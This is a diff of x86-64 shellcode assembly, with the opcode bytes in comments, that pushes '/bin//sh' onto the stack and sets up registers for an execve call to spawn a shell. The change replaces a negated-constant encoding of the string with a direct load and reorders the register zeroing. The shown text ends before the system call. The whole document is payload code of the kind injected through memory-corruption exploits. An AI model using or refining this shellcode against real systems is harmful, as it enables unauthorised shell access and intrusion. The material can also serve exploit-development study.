@@ -3,13 +3,13 @@
     .hidden _start
     .type _start, @function
 _start:
-    /* 48 bb d1 9d 96 91 d0 8c 97 ff */  movabs  $0xff978cd091969dd1, %rbx
-    /* 48 f7 db                      */  neg     %rbx       /* rbx = 0x68732f6e69622f */
+    /* 31 c0                         */  xor     %eax, %eax /* rax = 0 */
+    /* 99                            */  cltd               /* rdx = 0 */
+    /* 52                            */  push    %rdx
+    /* 48 bb 2f 62 69 6e 2f 2f 73 68 */  movabs  $0x68732f2f6e69622f, %rbx
     /* 53                            */  push    %rbx
     /* 54                            */  push    %rsp
     /* 5f                            */  pop     %rdi       /* rdi = "/bin//sh" */
-    /* 31 c0                         */  xor     %eax, %eax /* rax = 0 */
-    /* 99                            */  cltd               /* rdx = 0 */
     /* 52                            */  push    %rdx
     /* 57                            */  push    %rdi
     /* 54                            */  push    %rsp
